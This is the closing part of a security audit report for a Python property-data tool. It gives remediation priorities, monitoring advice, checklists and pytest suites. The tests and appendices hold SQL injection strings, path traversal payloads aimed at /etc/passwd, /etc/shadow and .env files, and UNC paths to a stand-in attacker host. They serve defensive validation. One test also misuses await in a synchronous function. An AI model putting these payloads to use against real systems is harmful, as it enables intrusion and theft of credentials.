**Overall Grade:** C+ (Passing core security, failing secrets management)

---

## Recommended Remediation Priorities

### Phase 1: IMMEDIATE (This Week)

1. **Remove .env from git history** (CRIT-001)
   - Execute git filter-branch command
   - Rotate all exposed credentials
   - Add pre-commit hook to block secrets

2. **Implement path validation** (HIGH-001)
   - Add `validate_file_path()` function
   - Apply to all CLI path arguments
   - Add tests for traversal attacks

3. **Add atomic file writes** (HIGH-002)
   - Implement temp-file-rename pattern
   - Add backup mechanism
   - Test interruption scenarios

### Phase 2: SHORT TERM (Next 2 Weeks)

4. **Fix token logging** (HIGH-003)
   - Add sensitive data filter to logging
   - Implement safe exception handling
   - Audit all log statements

5. **Batch file operations** (HIGH-004)
   - Reduce write frequency
   - Add progress checkpoints
   - Implement recovery mechanism

6. **Add input validation** (MED-001)
   - Validate address strings
   - Add length limits
   - Sanitize special characters

### Phase 3: MEDIUM TERM (Next Month)

7. **Implement API response validation** (MED-002)
   - Add Pydantic schemas for API responses
   - Validate before processing
   - Add schema version checking

8. **Add file locking** (MED-003)
   - Implement fcntl-based locking
   - Add lock timeout handling
   - Test concurrent access

9. **Improve error handling** (MED-005)
   - Add structured error tracking
   - Include stack traces in logs
   - Generate error statistics

### Phase 4: LONG TERM (Ongoing)

10. **Hardening improvements** (LOW-001 through LOW-004)
    - Add Content-Type validation
    - Set User-Agent headers
    - Configure certificate pinning
    - Externalize API endpoints

---

## Testing Recommendations

### Security Test Suite

```python
# tests/security/test_sql_injection.py
def test_sql_like_injection_prevention():
    """Verify LIKE pattern escaping prevents injection."""
    malicious_inputs = [
        "'; DROP TABLE properties; --",
        "100% complete",
        "file_name.txt",
        "\\'escaped",
    ]
    for inp in malicious_inputs:
        escaped = escape_like_pattern(inp)
        assert "DROP" not in escaped or "'" in escaped
        assert escaped.count("\\\\") >= inp.count("\\")

# tests/security/test_path_traversal.py
def test_path_traversal_blocked():
    """Verify path traversal attacks are blocked."""
    dangerous_paths = [
        Path("../../../etc/passwd"),
        Path("..\\..\\windows\\system32"),
        Path("/etc/shadow"),
        Path("//attacker.com/share"),
    ]
    for path in dangerous_paths:
        with pytest.raises(ValueError):
            validate_file_path(path, Path("data"))

# tests/security/test_atomic_writes.py
def test_atomic_write_on_interrupt():
    """Verify file integrity after interrupted write."""
    original_data = {"addr": {"lot": 8000}}
    save_enrichment(path, original_data)

    # Simulate interruption
    with mock.patch('json.dump', side_effect=KeyboardInterrupt):
        with pytest.raises(KeyboardInterrupt):
            save_enrichment(path, {"new": "data"})

    # Original should be intact
    loaded = load_enrichment(path)
    assert loaded == original_data

# tests/security/test_token_leakage.py
def test_no_token_in_logs(caplog):
    """Verify API tokens not logged."""
    token = "secret-token-12345"
    client = MaricopaAssessorClient(token=token)

    # Trigger error that might log
    with pytest.raises(Exception):
        await client._search_official_api("invalid")

    # Check logs don't contain token
    assert token not in caplog.text
    assert "***REDACTED***" in caplog.text or token not in caplog.text
```

---

## Monitoring and Detection

### Security Metrics to Track

1. **API Authentication Failures**
   - Track 401 responses
   - Alert on sustained failures (token compromised?)

2. **File System Anomalies**
   - Monitor file access patterns
   - Alert on unexpected path access
   - Track write failures

3. **Rate Limit Violations**
   - Monitor API rate limit headers
   - Track 429 responses
   - Adjust rate limiting as needed

4. **Error Rates**
   - Track error types and frequency
   - Alert on unusual patterns
   - Monitor for security-related errors

### Logging Improvements

```python
import structlog

# Use structured logging for better analysis
logger = structlog.get_logger()

logger.info(
    "api_request",
    endpoint="search_apn",
    address=address,
    status="success",
    duration_ms=123,
)

logger.error(
    "api_request_failed",
    endpoint="get_parcel",
    apn=apn,
    error_type="HTTPStatusError",
    status_code=500,
    duration_ms=456,
)
```

---

## Security Checklist

### Pre-Deployment Checklist

- [ ] All secrets removed from git history
- [ ] .env template created (.env.example)
- [ ] Pre-commit hooks installed
- [ ] Path validation implemented
- [ ] Atomic file writes enabled
- [ ] Token logging prevented
- [ ] API response validation added
- [ ] File locking implemented
- [ ] Security tests passing
- [ ] Error handling improved
- [ ] Rate limiting configured
- [ ] Monitoring alerts configured

### Post-Deployment Checklist

- [ ] Credentials rotated
- [ ] API access logs reviewed
- [ ] Error rates monitored
- [ ] File permissions verified
- [ ] Backup mechanism tested
- [ ] Recovery procedures documented
- [ ] Security training completed

---

## References

### Standards and Frameworks
- [OWASP Top 10 (2021)](https://owasp.org/www-project-top-ten/)
- [CWE Top 25 Software Weaknesses](https://cwe.mitre.org/top25/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)

### Tools
- [Bandit - Python Security Linter](https://bandit.readthedocs.io/)
- [pip-audit - Dependency Scanner](https://github.com/pypa/pip-audit)
- [TruffleHog - Secret Scanner](https://github.com/trufflesecurity/trufflehog)
- [git-secrets - Pre-commit Protection](https://github.com/awslabs/git-secrets)

### Related Documentation
- `docs/SECURITY.md` - Security guidelines
- `CLAUDE.md` - Project overview
- `.claude/protocols.md` - Operational protocols

---

## Appendix A: SQL Injection Test Cases

```python
# Comprehensive SQL injection test suite
SQL_INJECTION_TEST_CASES = [
    # Basic injection
    ("'; DROP TABLE properties; --", "''; DROP TABLE properties; --"),
    ("' OR '1'='1", "'' OR ''1''=''1"),

    # LIKE wildcards
    ("100% done", "100\\% done"),
    ("file_name", "file\\_name"),

    # Escape sequences
    ("\\backslash", "\\\\backslash"),
    ("multiple \\ slashes \\\\", "multiple \\\\ slashes \\\\\\\\"),

    # Combined attacks
    ("'%; DROP--", "''\\%; DROP--"),
    ("_wildcard' OR 1=1--", "\\_wildcard'' OR 1=1--"),
]

@pytest.mark.parametrize("input_val,expected", SQL_INJECTION_TEST_CASES)
def test_escape_like_pattern(input_val, expected):
    """Verify SQL LIKE pattern escaping."""
    assert escape_like_pattern(input_val) == expected
```

---

## Appendix B: Path Traversal Test Cases

```python
# Path traversal attack test cases
PATH_TRAVERSAL_ATTACKS = [
    # Unix-style
    "../../../etc/passwd",
    "../../.env",
    "/etc/shadow",

    # Windows-style
    "..\\..\\windows\\system32",
    "C:\\Windows\\System32",

    # Mixed
    "../../../windows/system32",
    "..\\../etc/passwd",

    # Encoded
    "%2e%2e%2f%2e%2e%2f",  # ../../../
    "..%252f..%252f",       # Double-encoded

    # UNC paths
    "//attacker.com/share/data.json",
    "\\\\attacker.com\\share\\data.json",
]

@pytest.mark.parametrize("path", PATH_TRAVERSAL_ATTACKS)
def test_path_traversal_blocked(path):
    """Verify path traversal attacks are blocked."""
    with pytest.raises(ValueError, match="outside allowed directory"):
        validate_file_path(Path(path), Path("data"))
```

---

**End of Security Audit Report**

*For questions or clarifications, contact the security team.*
